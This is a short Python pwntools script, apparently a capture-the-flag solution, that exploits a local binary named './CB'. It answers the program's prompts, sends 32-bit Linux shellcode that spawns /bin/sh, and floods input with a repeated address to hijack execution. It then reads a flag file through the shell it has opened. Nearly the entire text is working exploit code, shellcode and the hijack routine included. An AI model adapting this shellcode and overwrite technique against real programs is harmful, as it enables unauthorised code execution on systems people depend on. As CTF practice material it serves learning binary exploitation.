from pwn import *

s=process('./CB')

shell="\x31\xc0\x50\x68\x2f\x2f\x73"
shell+="\x68\x68\x2f\x62\x69\x6e\x89"
shell+="\xe3\x89\xc1\x89\xc2\xb0\x0b"
shell+="\xcd\x80\x31\xc0\x40\xcd\x80";

s.recvuntil('?')
s.sendline('Y')

s.recvuntil(': ')
s.sendline('20020212')

s.sendline(shell)

shellcode=p32(0x804a080)*(1024/4)

s.sendline(shellcode)

sleep(1)

s.sendline('cat ./flag')

s.recv(1024)
print "flag: "+s.recv(1024)
